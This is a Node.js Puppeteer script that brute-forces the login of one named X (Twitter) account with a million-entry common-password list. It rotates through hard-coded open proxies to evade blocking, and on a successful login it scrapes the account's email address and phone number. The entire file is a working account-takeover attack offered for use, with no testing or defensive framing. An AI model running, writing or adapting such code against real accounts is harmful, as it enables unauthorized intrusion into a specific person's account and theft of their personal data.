import puppeteer from 'puppeteer';
import fs from 'fs/promises';
import readline from 'readline';
import ProxyChain from 'proxy-chain'; // Import the proxy-chain package

// Path to your text file containing passwords
const passwordFilePath = '10-million-password-list-top-1000000.txt';

// List of proxies
const proxies = [
    'http://159.69.86.130:80',
    'http://217.13.109.78:80',
    'http://49.13.9.253:80',
    'http://195.62.32.117:22331',
    'socks4://78.133.163.190:4145',
    'http://103.86.109.38:80',
    'http://222.89.237.101:9002',
    'http://8.223.31.16:80'
];

async function getProxyUrl(proxy) {
    // Convert proxy URL to anonymized proxy URL
    return await ProxyChain.anonymizeProxy(proxy);
}

async function extractAccountDetails(page) {
    try {
        // Wait for and extract account details
        const accountName = await page.evaluate(() => {
            const nameElement = document.querySelector('div[data-testid="UserProfileHeader_Items"] span');
            return nameElement ? nameElement.textContent : 'Not found';
        });

        const email = await page.evaluate(() => {
            // Adjust selector as necessary
            const emailElement = document.querySelector('a[href*="email"]');
            return emailElement ? emailElement.textContent : 'Not found';
        });

        const mobileNumber = await page.evaluate(() => {
            // Adjust selector as necessary
            const mobileElement = document.querySelector('a[href*="phone"]');
            return mobileElement ? mobileElement.textContent : 'Not found';
        });

        console.log('Account Details:');
        console.log('Username:', accountName);
        console.log('Email:', email);
        console.log('Mobile Number:', mobileNumber);

    } catch (error) {
        console.error('Error extracting account details:', error);
    }
}

async function attemptLogin() {
    for (const proxy of proxies) {
        // Get anonymized proxy URL
        const proxyUrl = await getProxyUrl(proxy);
        let browser;
        try {
            browser = await puppeteer.launch({
                headless: false,
                ignoreHTTPSErrors: true,
                args: [`--proxy-server=${proxyUrl}`],
                timeout: 60000 // Set timeout to 60 seconds
            });

            const page = await browser.newPage();

            try {
                await page.goto('https://x.com/i/flow/login?lang=en', { waitUntil: 'networkidle2', timeout: 60000 });

                // Username to login
                const username = 'illusionXcrypto';

                // Wait for the username field to appear and input the username
                await page.waitForSelector('input[name="text"]', { visible: true });
                await page.type('input[name="text"]', username);
                console.log('Username entered.');

                // Click 'Next' button
                await page.waitForSelector('div.css-146c3p1.r-bcqeeo.r-qvutc0.r-1qd0xha.r-q4m81j.r-a023e6.r-rjixqe.r-b88u0q.r-1awozwy.r-6koalj.r-18u37iz.r-16y2uox.r-1777fci', { visible: true });
                await page.click('div.css-146c3p1.r-bcqeeo.r-qvutc0.r-1qd0xha.r-q4m81j.r-a023e6.r-rjixqe.r-b88u0q.r-1awozwy.r-6koalj.r-18u37iz.r-16y2uox.r-1777fci');
                console.log('Clicked Next button.');

                // Wait for the password input field to appear
                await page.waitForSelector('input[name="password"]', { visible: true });
                console.log('Password field is visible.');

                // Read passwords from file and attempt to log in
                const passwordStream = fs.createReadStream(passwordFilePath);
                const rl = readline.createInterface({
                    input: passwordStream,
                    crlfDelay: Infinity
                });

                for await (const password of rl) {
                    console.log(`Attempting login with password: ${password.trim()}`);

                    // Input password into the password field
                    await page.evaluate(password => {
                        const passwordField = document.querySelector('input[name="password"]');
                        passwordField.value = password;
                        // Trigger an input event to ensure the field updates
                        passwordField.dispatchEvent(new Event('input', { bubbles: true }));
                    }, password.trim());

                    // Click 'Log in' button
                    await page.click('button[data-testid="LoginForm_Login_Button"]');

                    // Wait for response
                    await page.waitForTimeout(3000); // Wait for 3 seconds for login response

                    // Check for login success or failure
                    const loginError = await page.$('div[role="alert"]'); // Adjust the selector if necessary
                    if (!loginError) {
                        console.log('Login successful!');
                        await extractAccountDetails(page); // Extract account details
                        break; // Exit loop on successful login
                    } else {
                        console.log('Login failed, trying next password.');
                    }

                    // Clear the password field for the next attempt
                    await page.evaluate(() => {
                        document.querySelector('input[name="password"]').value = '';
                    });

                    // Add delay before next attempt
                    await page.waitForTimeout(2000); // Wait for 2 seconds before next attempt
                }
            } catch (error) {
                console.error('Error during login attempt:', error);
            } finally {
                await browser.close();
            }

            // Add a delay before trying the next proxy
            await new Promise(resolve => setTimeout(resolve, 5000)); // Wait for 5 seconds before trying the next proxy
        } catch (error) {
            console.error(`Failed to launch browser with proxy ${proxy}:`, error);
        }
    }
}

attemptLogin().then(() => {
    console.log('Login attempts completed.');
}).catch(err => {
    console.error('Error during login attempts:', err);
});
